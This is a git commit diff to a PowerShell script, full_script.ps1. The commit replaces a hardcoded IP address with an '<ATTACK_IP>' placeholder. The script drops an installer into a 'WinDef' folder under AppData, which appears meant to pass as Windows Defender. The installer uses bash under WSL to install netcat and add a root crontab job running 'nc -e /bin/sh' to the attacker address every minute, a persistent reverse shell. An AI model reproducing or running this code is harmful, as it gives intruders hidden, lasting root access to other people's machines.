ec17000534a51292113aa6fea37fb4fa4baba65c
connormorley <43238073+connormorley@users.noreply.github.com>
2020-07-16 11:25:57 +0100

    Update full_script.ps1

--- full_script.ps1
+++ full_script.ps1
@@ -15,7 +15,7 @@ $installation = "`$timeout = 180`n`$code = { powershell.exe -ExecutionPolicy Byp
 C:\Users\CM_test\Desktop\init.ps1 }`n`$job = Start-Job -ScriptBlock `$code`nif (Wait-Job `$job -
 Timeout `$timeout) { Receive-Job `$job }`nStop-Job `$job`nRemove-Job `$job`nbash -c `"echo `'Hello
 World!`' > /home/test.txt && apt-get update && apt-get -y install netcat && echo `'* * * * * root nc -
-e /bin/sh 192.168.149.215 4444`' >> /etc/crontab && service cron restart`";"
+e /bin/sh <ATTACK_IP>`' >> /etc/crontab && service cron restart`";"
 $installation | Out-File "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\installer.ps1"
 $initialize = "kali;"
 $initialize | Out-File "C:\Users\CM_test\AppData\Local\Microsoft\WinDef\init.ps1"
